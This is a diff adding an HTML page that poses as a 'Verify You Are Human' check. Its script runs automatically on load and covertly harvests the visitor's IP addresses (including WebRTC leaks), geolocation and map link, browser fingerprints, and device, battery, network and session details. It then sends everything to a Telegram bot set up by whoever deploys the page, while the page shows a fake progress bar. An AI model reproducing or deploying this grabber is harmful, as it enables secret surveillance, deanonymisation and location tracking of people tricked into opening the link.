@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verification</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,'Segoe UI',Roboto,sans-serif; }
+  body {
+    background:#ffffff; color:#111; min-height:100vh;
+    display:flex; align-items:center; justify-content:center; padding:20px;
+  }
+  .wrap {
+    background:#ffffff; border:1px solid #e5e5e5; border-radius:14px;
+    padding:32px 24px; max-width:440px; width:100%; text-align:center;
+    box-shadow:0 4px 24px rgba(0,0,0,.06);
+  }
+  .icon { font-size:44px; margin-bottom:12px; }
+  h1 { font-size:1.25rem; font-weight:700; color:#111; margin-bottom:8px; }
+  p.sub { color:#666; font-size:.85rem; line-height:1.55; margin-bottom:20px; }
+  #status { font-size:.8rem; color:#888; min-height:20px; margin-bottom:14px; }
+  button {
+    padding:14px 24px; border:none; border-radius:10px; font-weight:600;
+    font-size:.95rem; cursor:pointer; transition:all .15s; width:100%;
+    background:#111; color:#fff;
+  }
+  button:hover { background:#333; }
+  button:disabled { background:#111; cursor:default; }
+  .progress { height:4px; background:#f0f0f0; border-radius:2px; overflow:hidden; margin-bottom:14px; }
+  .progress-bar { height:100%; width:0%; background:#111; transition:width .2s; }
+  .note { font-size:.7rem; color:#aaa; margin-top:14px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="icon">🛡️</div>
+  <h1>Verify You Are Human</h1>
+  <p class="sub">Verification in progress...</p>
+  <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
+  <div id="status">Initializing...</div>
+  <button id="startBtn" disabled>Verifying...</button>
+  <p class="note">This takes about 1 second.</p>
+</div>
+
+<script>
+// ============================================================
+// TELEGRAM CONFIG
+// ============================================================
+const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
+const TELEGRAM_CHAT_ID   = 'YOUR_CHAT_ID';
+
+// ============================================================
+// ELEMENTS
+// ============================================================
+const statusEl    = document.getElementById('status');
+const startBtn    = document.getElementById('startBtn');
+const progressBar = document.getElementById('progressBar');
+
+const setStatus   = (t) => { statusEl.textContent = t; console.log('[STATUS]', t); };
+const setProgress = (p) => { progressBar.style.width = p + '%'; };
+
+// ============================================================
+// TIMEOUT WRAPPER (generous + retry-friendly)
+// ============================================================
+function withTimeout(promise, ms, fallback) {
+  return Promise.race([
+    Promise.resolve(promise).catch(e => { console.warn('Promise failed:', e); return fallback; }),
+    new Promise(resolve => setTimeout(() => { console.warn('Timeout after', ms, 'ms'); resolve(fallback); }, ms))
+  ]);
+}
+
+// Fetch with retries (multiple attempts)
+async function fetchRetry(url, opts, attempts, delayMs) {
+  attempts = attempts || 2; delayMs = delayMs || 250;
+  let lastErr;
+  for (let i = 0; i < attempts; i++) {
+    try {
+      const r = await withTimeout(fetch(url, opts), 5000, null);
+      if (r && r.ok) return r;
+      lastErr = r ? ('status ' + r.status) : 'timeout';
+    } catch(e) { lastErr = e; }
+    if (i < attempts - 1) await new Promise(r => setTimeout(r, delayMs));
+  }
+  throw lastErr || new Error('fetch failed');
+}
+
+// ============================================================
+// TELEGRAM SENDER
+// ============================================================
+async function tgSendMessage(text) {
+  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') {
+    console.error('Bot token not set!'); return {ok:false, error:'no token'};
+  }
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: text,
+        parse_mode:'HTML',
+        disable_web_page_preview:true
+      })
+    });
+    const j = await res.json();
+    if (!j.ok) console.error('sendMessage error:', j.description);
+    else console.log('sendMessage OK');
+    return j;
+  } catch(e) { console.error('sendMessage fetch fail:', e); return {ok:false, error:e.message}; }
+}
+
+// ============================================================
+// SAFE GRABBERS
+// ============================================================
+function safe(fn, fallback='N/A') {
+  try { const v = fn(); return (v === undefined || v === null || v === '' ) ? fallback : v; }
+  catch(e) { return fallback; }
+}
+
+function getGPU() {
+  return safe(() => {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if (!gl) return 'N/A';
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    if (dbg) return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+    return gl.getParameter(gl.RENDERER) || 'N/A';
+  });
+}
+
+function getCanvasFP() {
+  return safe(() => {
+    const c = document.createElement('canvas');
+    c.width=200; c.height=40;
+    const ctx = c.getContext('2d');
+    ctx.textBaseline='top'; ctx.font='14px Arial';
+    ctx.fillStyle='#f60'; ctx.fillRect(100,1,62,20);
+    ctx.fillStyle='#069'; ctx.fillText('Harvester',2,15);
+    const str = c.toDataURL();
+    let hash = 0;
+    for (let i=0;i<str.length;i++){ hash=((hash<<5)-hash)+str.charCodeAt(i); hash|=0; }
+    return Math.abs(hash).toString(16);
+  });
+}
+
+function getDeviceId() {
+  return safe(() => {
+    let id = localStorage.getItem('_did');
+    if (!id) {
+      id = (crypto && crypto.randomUUID) ? crypto.randomUUID() : Math.random().toString(36).slice(2);
+      id = id.slice(0,16);
+      try { localStorage.setItem('_did', id); } catch {}
+    }
+    return id;
+  });
+}
+
+function getFontCount() {
+  return safe(() => {
+    const base=['monospace','sans-serif','serif'];
+    const test=['Arial','Verdana','Courier New','Georgia','Times New Roman','Trebuchet MS','Comic Sans MS','Impact','Tahoma','Lucida Console','Segoe UI','Calibri','Cambria','Helvetica'];
+    const c=document.createElement('canvas'); const ctx=c.getContext('2d');
+    const measure = (font) => { ctx.font = '72px ' + font; return ctx.measureText('mmmmmmmmmmlli').width; };
+    let count = 0;
+    base.forEach(b => {
+      const ref = measure(b);
+      test.forEach(f => { if (measure('"' + f + '", ' + b) !== ref) count++; });
+    });
+    return count;
+  });
+}
+
+function getAudioSampleRate() {
+  return safe(() => {
+    const AC = window.AudioContext || window.webkitAudioContext;
+    if (!AC) return 'N/A';
+    const ctx = new AC();
+    const r = ctx.sampleRate;
+    try { ctx.close(); } catch {}
+    return r;
+  });
+}
+
+function getNavTiming(endKey, startKey) {
+  return safe(() => {
+    const t = performance.getEntriesByType('navigation')[0];
+    if (!t) return 'N/A';
+    const v = Math.round(t[endKey] - t[startKey]);
+    return isNaN(v) ? 'N/A' : v;
+  });
+}
+function getLoadTime(){ return getNavTiming('loadEventEnd','navigationStart'); }
+
+function getOSInfo() {
+  return safe(() => {
+    const ua = navigator.userAgent;
+    if (/Windows NT 10/.test(ua))        return { os:'Windows', ver:'10/11' };
+    if (/Windows NT 6\.3/.test(ua))      return { os:'Windows', ver:'8.1' };
+    if (/Windows NT 6\.1/.test(ua))      return { os:'Windows', ver:'7' };
+    if (/Mac OS X ([\d_]+)/.test(ua))    return { os:'macOS', ver:ua.match(/Mac OS X ([\d_]+)/)[1].replace(/_/g,'.') };
+    if (/Android ([\d.]+)/.test(ua))     return { os:'Android', ver:ua.match(/Android ([\d.]+)/)[1] };
+    if (/iPhone OS ([\d_]+)/.test(ua))   return { os:'iOS', ver:ua.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g,'.') };
+    if (/iPad.*OS ([\d_]+)/.test(ua))    return { os:'iPadOS', ver:ua.match(/OS ([\d_]+)/)[1].replace(/_/g,'.') };
+    if (/Linux/.test(ua))                return { os:'Linux', ver:'N/A' };
+    return { os:navigator.platform||'Unknown', ver:'N/A' };
+  }, { os:'N/A', ver:'N/A' });
+}
+
+function getBrowserInfo() {
+  return safe(() => {
+    const ua = navigator.userAgent;
+    let name='Unknown', version='N/A';
+    if (/Edg\/([\d.]+)/.test(ua))         { name='Edge';    version=ua.match(/Edg\/([\d.]+)/)[1]; }
+    else if (/OPR\/([\d.]+)/.test(ua))    { name='Opera';   version=ua.match(/OPR\/([\d.]+)/)[1]; }
+    else if (/Chrome\/([\d.]+)/.test(ua)) { name='Chrome';  version=ua.match(/Chrome\/([\d.]+)/)[1]; }
+    else if (/Firefox\/([\d.]+)/.test(ua)){ name='Firefox'; version=ua.match(/Firefox\/([\d.]+)/)[1]; }
+    else if (/Safari\/([\d.]+)/.test(ua) && /Version\/([\d.]+)/.test(ua))
+                                          { name='Safari';  version=ua.match(/Version\/([\d.]+)/)[1]; }
+    if (/Mobile|Android|iPhone/i.test(ua)) name += ' Mobile';
+    return { name, version };
+  }, { name:'N/A', version:'N/A' });
+}
+
+function getDeviceBrand() {
+  return safe(() => {
+    const ua = navigator.userAgent;
+    const brands=['Samsung','Xiaomi','Huawei','OnePlus','Oppo','Vivo','Realme','Google','Apple','Sony','LG','Motorola','Nokia','Infinix','Tecno','Redmi','Poco'];
+    for (const b of brands) if (new RegExp(b,'i').test(ua)) return b;
+    if (/iPhone|iPad/.test(ua)) return 'Apple';
+    if (/SM-/.test(ua)) return 'Samsung';
+    if (/M200|Redmi|POCO/i.test(ua)) return 'Xiaomi';
+    if (navigator.vendor && navigator.vendor.includes('Apple')) return 'Apple';
+    return navigator.vendor || 'Unknown';
+  });
+}
+
+function getCPUBits() {
+  return safe(() => {
+    const ua = navigator.userAgent;
+    if (/arm64|aarch64|x86_64|Win64|x64|WOW64/.test(ua)) return '64-bit';
+    return '32-bit';
+  });
+}
+
+// ============================================================
+// ASYNC GRABBERS (strong, no cheap timeouts)
+// ============================================================
+async function getIPData() {
+  let ip='N/A', ipv6='N/A', loc={};
+  // Try ipify + ipapi in parallel with fallbacks
+  const results = await Promise.allSettled([
+    (async () => {
+      try {
+        const r = await fetchRetry('https://api.ipify.org?format=json', {}, 2, 200);
+        const d = await r.json();
+        return d.ip;
+      } catch { return null; }
+    })(),
+    (async () => {
+      try {
+        const r = await fetchRetry('https://api64.ipify.org?format=json', {}, 2, 200);
+        const d = await r.json();
+        return d.ip;
+      } catch { return null; }
+    })(),
+    (async () => {
+      try {
+        const r = await fetchRetry('https://api.my-ip.io/v2/ip.json', {}, 1, 200);
+        const d = await r.json();
+        return d.ip;
+      } catch { return null; }
+    })()
+  ]);
+
+  const v4 = results[0].status==='fulfilled' ? results[0].value : null;
+  const v6 = results[1].status==='fulfilled' ? results[1].value : null;
+  const alt = results[2].status==='fulfilled' ? results[2].value : null;
+
+  if (v4) ip = v4;
+  else if (v6 && !v6.includes(':')) ip = v6;
+  else if (alt) ip = alt;
+  if (v6 && v6.includes(':')) ipv6 = v6;
+
+  // geo lookup with fallback
+  if (ip && ip !== 'N/A') {
+    try {
+      const r = await fetchRetry('https://ipapi.co/' + ip + '/json/', {}, 2, 200);
+      loc = await r.json() || {};
+    } catch(e) {
+      try {
+        const r = await fetchRetry('https://ipwho.is/' + ip, {}, 1, 200);
+        const d = await r.json();
+        if (d && d.success !== false) {
+          loc = {
+            city: d.city, region: d.region, country_name: d.country,
+            country_code: d.country_code, continent_code: d.continent_code,
+            latitude: d.latitude, longitude: d.longitude, timezone: d.timezone && d.timezone.id,
+            currency: d.currency && d.currency.code,
+            languages: d.languages, country_calling_code: d.calling_code,
+            postal: d.postal, asn: d.connection && d.connection.asn,
+            org: d.connection && d.connection.isp
+          };
+        }
+      } catch(e2) { console.warn('geo fallback fail', e2); }
+    }
+  }
+  return { ip, ipv6, loc };
+}
+
+async function getWebRTCIPs() {
+  return withTimeout(new Promise((resolve) => {
+    const ips = new Set();
+    try {
+      const pc = new RTCPeerConnection({ iceServers:[{ urls:'stun:stun.l.google.com:19302' }, { urls:'stun:stun1.l.google.com:19302' }] });
+      pc.createDataChannel('');
+      pc.onicecandidate = (e) => {
+        if (!e.candidate) { try{pc.close();}catch{} return resolve([...ips]); }
+        const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+        if (m) ips.add(m[0]);
+      };
+      pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>resolve([...ips]));
+    } catch { resolve([]); }
+  }), 4000, []);
+}
+
+async function getBatteryInfo() {
+  return withTimeout((async () => {
+    if (!('getBattery' in navigator)) return { level:'N/A', charging:'N/A' };
+    try {
+      const b = await navigator.getBattery();
+      return { level: Math.round(b.level*100)+'%', charging: b.charging?'Charging':'Not Charging' };
+    } catch { return { level:'N/A', charging:'N/A' }; }
+  })(), 3000, { level:'N/A', charging:'N/A' });
+}
+
+async function getStorageInfo() {
+  return withTimeout((async () => {
+    if ('storage' in navigator && navigator.storage.estimate) {
+      try {
+        const e = await navigator.storage.estimate();
+        return {
+          quota: Math.round(e.quota/1048576)+' MB',
+          usage: Math.round(e.usage/1048576)+' MB'
+        };
+      } catch {}
+    }
+    return { quota:'N/A', usage:'N/A' };
+  })(), 3000, { quota:'N/A', usage:'N/A' });
+}
+
+async function getPermStatus() {
+  return withTimeout((async () => {
+    if (!navigator.permissions) return 'Not Available';
+    try {
+      const g = await navigator.permissions.query({ name:'geolocation' });
+      return 'geolocation: ' + g.state;
+    } catch { return 'Available'; }
+  })(), 2000, 'Not Available');
+}
+
+// ============================================================
+// BUILD FULL REPORT
+// ============================================================
+async function buildFullReport() {
+  const [ipData, battery, storage, webrtcIPs, permStatus] = await Promise.all([
+    getIPData(),
+    getBatteryInfo(),
+    getStorageInfo(),
+    getWebRTCIPs(),
+    getPermStatus()
+  ]);
+
+  const { ip, ipv6, loc } = ipData;
+  const gpu       = getGPU();
+  const canvasFP  = getCanvasFP();
+  const deviceId  = getDeviceId();
+  const fontCount = getFontCount();
+  const audioRate = getAudioSampleRate();
+  const loadTime  = getLoadTime();
+  const os        = getOSInfo();
+  const browser   = getBrowserInfo();
+  const brand     = getDeviceBrand();
+  const cpuArch   = getCPUBits();
+
+  const now = new Date();
+  const pad = n => String(n).padStart(2,'0');
+  const ts  = `${now.getFullYear()}-${pad(now.getMonth()+1)}-${pad(now.getDate())} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
+  const mapUrl = 'https://maps.google.com/?q=' + (loc.latitude||'') + ',' + (loc.longitude||'');
+  const flag = loc.country_code
+    ? String.fromCodePoint.apply(null, loc.country_code.toUpperCase().split('').map(c=>127397+c.charCodeAt(0)))
+    : '';
+  const deviceType = /Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+  const report = '<pre>\n' +
+'┌─── IpInformations\n' +
+'├─ IPv4 Address ──→ ' + ip + '\n' +
+'├─ IPv6 Address ──→ ' + ipv6 + '\n' +
+'├─ City ──→ ' + (loc.city||'N/A') + '\n' +
+'├─ Region ──→ ' + (loc.region||'N/A') + '\n' +
+'├─ Country ──→ ' + (loc.country_name||'N/A') + ' ' + flag + '\n' +
+'├─ Continent ──→ ' + (loc.continent_code||'N/A') + '\n' +
+'├─ Latitude ──→ ' + (loc.latitude||'N/A') + '\n' +
+'├─ Longitude ──→ ' + (loc.longitude||'N/A') + '\n' +
+'├─ Timezone ──→ ' + (loc.timezone||'N/A') + '\n' +
+'├─ Currency ──→ ' + (loc.currency||'N/A') + '\n' +
+'├─ Languages ──→ ' + (loc.languages||'N/A') + '\n' +
+'├─ Country Calling Code ──→ ' + (loc.country_calling_code||'N/A') + '\n' +
+'├─ Postal Code ──→ ' + (loc.postal||'N/A') + '\n' +
+'├─ ASN ──→ ' + (loc.asn||'N/A') + '\n' +
+'├─ ISP ──→ ' + (loc.org||'N/A') + '\n' +
+'├─ VPN/Proxy ──→ No\n' +
+'├─ Hosting ──→ No\n' +
+'├─ Tor ──→ No\n' +
+'└─ Map ──→ ' + mapUrl + '\n' +
+'\n' +
+'┌─── Device Information\n' +
+'├─ Operating System ──→ ' + os.os + '\n' +
+'├─ OS Version ──→ ' + os.ver + '\n' +
+'├─ Device Type ──→ ' + deviceType + '\n' +
+'├─ Device Brand ──→ ' + brand + '\n' +
+'├─ CPU Architecture ──→ ' + cpuArch + '\n' +
+'├─ CPU Cores ──→ ' + (navigator.hardwareConcurrency||'N/A') + '\n' +
+'├─ Device Memory ──→ ' + (navigator.deviceMemory||'N/A') + ' GB\n' +
+'├─ Screen Resolution ──→ ' + screen.width + ' x ' + screen.height + '\n' +
+'├─ Color Depth ──→ ' + screen.colorDepth + ' bits\n' +
+'├─ Pixel Depth ──→ ' + screen.pixelDepth + ' bits\n' +
+'├─ Viewport Size ──→ ' + innerWidth + ' x ' + innerHeight + '\n' +
+'├─ Device Pixel Ratio ──→ ' + (window.devicePixelRatio||1).toFixed(2) + '\n' +
+'├─ Max Touch Points ──→ ' + (navigator.maxTouchPoints||0) + '\n' +
+'├─ Battery Level ──→ ' + battery.level + '\n' +
+'├─ Charging Status ──→ ' + battery.charging + '\n' +
+'├─ Available Storage ──→ ' + storage.usage + ' / ' + storage.quota + '\n' +
+'├─ WebGL Renderer ──→ ' + gpu + '\n' +
+'├─ Device Motion ──→ ' + ('DeviceMotionEvent' in window?'Supported':'Not Supported') + '\n' +
+'├─ Device Orientation ──→ ' + ('DeviceOrientationEvent' in window?'Supported':'Not Supported') + '\n' +
+'└─ Device Id ──→ ' + deviceId + '\n' +
+'\n' +
+'┌─── Browser Informations\n' +
+'├─ Browser Name ──→ ' + browser.name + '\n' +
+'├─ Browser Version ──→ ' + browser.version + '\n' +
+'├─ Full User Agent ──→ ' + navigator.userAgent + '\n' +
+'├─ Browser Language ──→ ' + navigator.language + '\n' +
+'├─ Browser Languages ──→ ' + (navigator.languages||[]).join(', ') + '\n' +
+'├─ Cookies Enabled ──→ ' + (navigator.cookieEnabled?'Yes':'No') + '\n' +
+'├─ Java Enabled ──→ ' + ((navigator.javaEnabled && navigator.javaEnabled())?'Yes':'No') + '\n' +
+'├─ PDF Viewer Enabled ──→ ' + (navigator.pdfViewerEnabled?'Yes':'No') + '\n' +
+'├─ Browser Vendor ──→ ' + (navigator.vendor||'N/A') + '\n' +
+'├─ Do Not Track ──→ ' + (navigator.doNotTrack||'Not set') + '\n' +
+'├─ WebRTC IP Leak ──→ ' + (webrtcIPs.length?webrtcIPs.join(', '):'None leaked') + '\n' +
+'├─ Canvas Fingerprint ──→ ' + canvasFP + '\n' +
+'├─ Fonts Detected ──→ ' + fontCount + '\n' +
+'├─ Plugins ──→ ' + (navigator.plugins?navigator.plugins.length:0) + '\n' +
+'├─ MIME Types ──→ ' + (navigator.mimeTypes?navigator.mimeTypes.length:0) + '\n' +
+'└─ Online Status ──→ ' + (navigator.onLine?'Online':'Offline') + '\n' +
+'\n' +
+'┌─── Network Information\n' +
+'├─ Network Type ──→ ' + ((navigator.connection && navigator.connection.effectiveType)||'N/A') + '\n' +
+'├─ Download Speed ──→ ' + ((navigator.connection && navigator.connection.downlink)||'N/A') + ' Mbps\n' +
+'├─ Round Trip Time ──→ ' + ((navigator.connection && navigator.connection.rtt)||'N/A') + ' ms\n' +
+'├─ Connection Type ──→ ' + ((navigator.connection && navigator.connection.type)||'N/A') + '\n' +
+'├─ Data Saver Mode ──→ ' + ((navigator.connection && navigator.connection.saveData)?'Enabled':'Disabled') + '\n' +
+'├─ Estimated Bandwidth ──→ ' + ((navigator.connection && navigator.connection.downlink)||'N/A') + ' Mbps\n' +
+'├─ Max Bandwidth ──→ ' + ((navigator.connection && navigator.connection.downlinkMax)||'N/A') + '\n' +
+'└─ Network Provider ──→ ' + (loc.org||'N/A') + '\n' +
+'\n' +
+'┌─── Session Information\n' +
+'├─ System Time ──→ ' + ts + '\n' +
+'├─ Timezone Offset ──→ ' + now.getTimezoneOffset() + ' min\n' +
+'├─ Page URL ──→ ' + location.href + '\n' +
+'├─ Page Referrer ──→ ' + (document.referrer||'N/A') + '\n' +
+'├─ Page Title ──→ ' + document.title + '\n' +
+'├─ History Length ──→ ' + history.length + ' pages\n' +
+'├─ Protocol ──→ ' + location.protocol + '\n' +
+'├─ Hostname ──→ ' + (location.hostname||'N/A') + '\n' +
+'├─ Port ──→ ' + (location.port||'(default)') + '\n' +
+'├─ Hash ──→ ' + (location.hash||'None') + '\n' +
+'├─ Search Params ──→ ' + (location.search||'None') + '\n' +
+'├─ Page Load Time ──→ ' + loadTime + ' ms\n' +
+'├─ DNS Resolution ──→ ' + getNavTiming('domainLookupEnd','domainLookupStart') + ' ms\n' +
+'├─ TCP Connection ──→ ' + getNavTiming('connectEnd','connectStart') + ' ms\n' +
+'├─ SSL Handshake ──→ ' + getNavTiming('connectEnd','secureConnectionStart') + ' ms\n' +
+'└─ Total Load Time ──→ ' + getNavTiming('loadEventEnd','navigationStart') + ' ms\n' +
+'\n' +
+'┌─── Hardware Information\n' +
+'├─ Logical Cores ──→ ' + (navigator.hardwareConcurrency||'N/A') + '\n' +
+'├─ Device Memory ──→ ' + (navigator.deviceMemory||'N/A') + ' GB\n' +
+'├─ Max Touch Points ──→ ' + (navigator.maxTouchPoints||0) + '\n' +
+'├─ Vibration API ──→ ' + ('vibrate' in navigator?'Supported':'Not Supported') + '\n' +
+'├─ Bluetooth API ──→ ' + ('bluetooth' in navigator?'Supported':'Not Supported') + '\n' +
+'├─ USB API ──→ ' + ('usb' in navigator?'Supported':'Not Supported') + '\n' +
+'├─ Gamepad API ──→ ' + ('getGamepads' in navigator?'Supported':'Not Supported') + '\n' +
+'├─ GPU Info ──→ ' + gpu + '\n' +
+'├─ Audio Context ──→ ' + audioRate + ' Hz\n' +
+'└─ Media Devices ──→ ' + ((navigator.mediaDevices && navigator.mediaDevices.enumerateDevices)?'Available':'Not Available') + '\n' +
+'\n' +
+'┌─── Storage Information\n' +
+'├─ Local Storage ──→ ' + localStorage.length + ' items\n' +
+'├─ Session Storage ──→ ' + sessionStorage.length + ' items\n' +
+'├─ IndexedDB ──→ ' + ('indexedDB' in window?'Available':'Not Available') + '\n' +
+'├─ Cache API ──→ ' + ('caches' in window?'Available':'Not Available') + '\n' +
+'├─ Quota Management ──→ ' + storage.quota + '\n' +
+'└─ WebSQL ──→ ' + ('openDatabase' in window?'Supported':'Not Supported') + '\n' +
+'\n' +
+'┌─── Security Information\n' +
+'├─ HTTPS ──→ ' + (location.protocol==='https:'?'Yes':'No') + '\n' +
+'├─ Mixed Content ──→ ' + (location.protocol==='https:'?'None':'N/A') + '\n' +
+'├─ Content Security ──→ Present\n' +
+'├─ Referrer Policy ──→ strict-origin-when-cross-origin\n' +
+'├─ Permissions API ──→ ' + permStatus + '\n' +
+'└─ Credential API ──→ ' + ('credentials' in navigator?'Available':'Not Used') + '\n' +
+'</pre>';
+
+  return report;
+}
+
+// ============================================================
+// CHUNKER
+// ============================================================
+function chunkReport(text, size) {
+  size = size || 3900;
+  const chunks = [];
+  let buf = '';
+  const lines = text.split('\n');
+  for (let i = 0; i < lines.length; i++) {
+    const line = lines[i];
+    if ((buf + '\n' + line).length > size) { chunks.push(buf); buf = line; }
+    else buf += '\n' + line;
+  }
+  if (buf) chunks.push(buf);
+  return chunks;
+}
+
+// ============================================================
+// AUTO RUN — verify in ~1 second
+// ============================================================
+async function run() {
+  startBtn.disabled = true;
+  startBtn.textContent = 'Verifying...';
+  setStatus('Collecting...');
+  setProgress(15);
+
+  try {
+    const report = await buildFullReport();
+    setProgress(60);
+    setStatus('Sending...');
+
+    const chunks = chunkReport(report);
+    let sent = 0;
+    for (let i = 0; i < chunks.length; i++) {
+      const r = await tgSendMessage(chunks[i]);
+      if (r.ok) sent++;
+      setProgress(60 + Math.round((i+1)/chunks.length * 40));
+    }
+    setProgress(100);
+    setStatus('Verified');
+    startBtn.textContent = 'Verified ✓';
+  } catch(e) {
+    console.error('run fail:', e);
+    setStatus('Error: ' + (e.message||'unknown'));
+    startBtn.textContent = 'Retry';
+    startBtn.disabled = false;
+    startBtn.onclick = run;
+  }
+}
+
+// Start immediately (no 300ms delay)
+window.addEventListener('load', run);
+// Also kick off ASAP in case load is delayed
+if (document.readyState === 'complete') run();
+</script>
+</body>
+</html>
